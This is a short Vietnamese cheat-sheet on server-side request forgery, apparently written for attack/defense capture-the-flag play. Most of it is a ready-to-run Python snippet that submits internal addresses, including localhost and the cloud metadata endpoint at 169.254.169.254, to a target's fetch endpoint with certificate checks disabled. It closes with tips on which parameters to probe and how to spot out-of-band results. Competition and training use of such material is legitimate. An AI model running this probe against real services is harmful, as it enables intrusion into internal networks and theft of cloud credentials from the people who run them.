# SSRF

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

targets = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",  # chỉ có ý nghĩa ở cloud
]
for t in targets:
    r = s.post(f"{base}/fetch", data={"url": t}, timeout=5)
    print(t, r.status_code, len(r.text), r.text[:120])
```

## Lưu ý nhanh
- Thử các vị trí hay gặp: `url=`, `path=`, `image=`, webhook, import từ URL.
- Kết quả SSRF có thể là body, status/time khác nhau, hoặc out-of-band; log lại đầy đủ.
- Trong A/D, tránh quét dải nội bộ rộng gây ồn/tải nặng.